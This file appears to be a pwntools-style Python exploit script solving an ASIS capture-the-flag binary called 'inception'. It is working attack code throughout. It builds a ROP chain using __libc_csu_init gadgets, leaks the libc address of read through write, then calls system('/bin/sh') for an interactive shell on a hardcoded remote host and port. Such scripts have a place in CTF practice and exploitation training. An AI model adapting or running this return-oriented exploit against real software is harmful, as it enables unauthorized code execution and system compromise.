#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './inception'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'37.139.17.37', 'port':1338})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)
addr_got_read       = binf.got['read']
addr_plt_write      = binf.plt['write']
addr_bss            = binf.sep_section['.bss']
addr_csu_init_1     = 0x400cea
addr_csu_init_2     = 0x400cd0

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_read    = libc.sep_function['read']

#==========

def attack(conn):
    rop = ROP(binf)

    exploit  = 'ASIS{N0T_R34LLY_4_FL4G}'.ljust(0x20, '\x00')
    exploit += p64(0xdeadbeef)
    exploit += p64(rop.rdi.address)
    exploit += p64(constants.STDOUT_FILENO)
    exploit += p64(rop.rsi_r15.address)
    exploit += p64(addr_got_read)
    exploit += p64(0xdeadbeef)
    exploit += p64(addr_plt_write)

    exploit += p64(addr_csu_init_1)
    exploit += p64(0)   # rbx
    exploit += p64(1)   # rbp
    exploit += p64(addr_got_read)           # r12
    exploit += p64(constants.STDIN_FILENO)  # r13 -> rdi
    exploit += p64(addr_bss + 0x30)         # r14 -> rsi
    exploit += p64(0x100)                   # r15 -> rdx
    exploit += p64(addr_csu_init_2)
    exploit += p64(0xdeadbeef)*7
    exploit += p64(rop.rdi.address)
    exploit += p64(6)
    exploit += p64(addr_plt_write)
    conn.sendafter('something: ', exploit)
    conn.recv(8)

    addr_libc_read      = u64(conn.recv(8))
    libc.address        = addr_libc_read - offset_libc_read
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search('/bin/sh'))
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    payload  = 'TRANSMISSION_OVER'.ljust(0x20, '\x00')
    payload += p64(0xc0bebeef)
    payload += p64(rop.ret.address)
    payload += p64(rop.rdi.address)
    payload += p64(addr_libc_str_sh)
    payload += p64(addr_libc_system)
    conn.send(payload)

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
